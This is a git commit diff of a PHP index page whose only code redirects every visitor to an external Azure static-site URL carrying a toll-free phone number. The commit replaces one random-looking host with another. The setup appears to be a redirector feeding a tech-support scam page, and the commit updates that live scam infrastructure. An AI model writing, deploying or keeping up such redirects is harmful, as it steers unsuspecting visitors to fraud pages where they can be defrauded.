a2bc795695547a04f3a6fc77cbf3f26e2fc53c91
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-04 21:23:29 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://underdog65fights6sdcall.z11.web.core.windows.net/index.html?Aniph=1-833-443-3001");
+header("Location: https://royalschat6dw8hdw93h8efu.z31.web.core.windows.net/index.html?Aniph=1-833-443-3001");
 
 exit;
 ?>
